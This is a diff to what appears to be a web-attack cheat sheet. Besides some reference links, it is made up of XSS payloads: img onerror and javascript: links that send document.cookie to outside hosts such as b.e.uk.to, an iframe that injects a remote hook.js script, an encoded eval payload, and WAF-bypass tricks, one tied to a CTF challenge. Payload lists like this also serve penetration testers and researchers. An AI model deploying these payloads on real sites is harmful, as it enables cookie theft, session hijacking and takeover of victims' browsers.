@@ -16,6 +16,9 @@ https://soroush.secproject.com/blog/2014/04/how-did-i-bypass-everything-in-modse
 http://sirdarckcat.blogspot.com.au/
 https://www.youtube.com/watch?v=tDjw0cmKS48 "Unusual Web Bugs" by kuza55
 
+# safari URL redirection XSS - CVE-2016-4585
+http://www.mbsd.jp/blog/20160921_2.html
+
 # flash
 https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/
 http://web.archive.org/web/20130808104241/http:/appsec.ws/FlashExploitDatabase.php
@@ -32,7 +35,7 @@ document['location']='http://3652113177/'+document['cookie'] # sans les caracter
 onfocus="alert(0)" autofocus="autofocus" asdf="
 <style>body  > *{display:none;}body:after{font-size:xx-large;content:"this is not how you send people to mars"}</style>
 
-div><img/src="" onerror=alert(0)> // or with src=#
+div><img/src=a onerror=alert(0)>
 
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />
 
@@ -103,7 +106,8 @@ asp.net: the csrf protection is to actually include the session ID is in the Vie
 <script src=//b.e.uk.to/a.js></script>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://6.6.6.6:3000/hook.js";document.body.appendChild(sc);'/>
 <iframe src=//b.e.uk.to /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
-<a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google ctf 2016 geokitties trick where waf triggered when there was any non-empty event handler
+<a href="javascript:location='http://x/'%2bdocument.cookie" onclick="">x</a> # google-ctf-2016 geokitties trick where waf triggered when there was any non-empty event handler
+\x3cimg src=a onerror=\u0022eval(String.fromCharCode(..))\u0022\x3e
 <img src=%23 onerror="document.location='http://b.e.uk.to/?c='%2bdocument.cookie">
 <img src=/ onerror=location='http://b.e.uk.to/?c='%2bdocument.cookie>
 new Image().src="http://b.e.uk.to/xss/?"+escape(document.cookie);
